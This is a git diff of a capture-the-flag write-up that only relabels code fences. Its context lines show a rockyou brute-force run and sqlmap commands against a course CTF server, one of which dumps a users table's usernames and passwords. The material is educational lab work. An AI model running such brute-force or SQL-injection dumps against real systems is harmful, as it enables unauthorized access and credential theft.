@@ -112,7 +112,7 @@ for i in range(tn):
     t.start()
 ```
 - the password is located around 40% of rockyou
-```ps
+```powershell
 PS D:\1111_work\1111attack_and_defense\security_2022> py .\web\monster\brute_force_multi_thread.py
 14344391
  41%|███████████████████████████████████████████████████████▊                                                                                 | 5849900/14344391 [2:36:26<3:08:18, 751.83it/s]bocchio
@@ -213,21 +213,21 @@ http://ctf.adl.tw:12003/
     - copy the content of the post request to search-test.txt
     - sqlmap
 1. Didn't work
-```ps
+```powershell
 PS D:\1111_work\1111attack_and_defense\sqlmap> py sqlmap.py -u 'http://ctf.adl.tw:12003/' --data "username=123&password=123" --level=5 --risk=3 --tamper=my_tamper/my_tamper.py
 ```
 2. Didn't work
-```ps
+```powershell
 PS D:\1111_work\1111attack_and_defense\sqlmap> py sqlmap.py -r './my_tamper/search-test.txt'-p username password --tamper=my_tamper/my_tamper.py
 ```
 
 3. Worked
-```ps
+```powershell
 PS D:\1111_work\1111attack_and_defense\sqlmap> py sqlmap.py -r './my_tamper/search-test.txt'-p username password -D ctf_users -T users -C password username --tamper=my_tamper/my_tamper.py --dump
 ```
 
 - Sqlmap logs
-```
+```powershell
 PS D:\1111_work\1111attack_and_defense\sqlmap> py .\sqlmap.py -h
         ___
        __H__
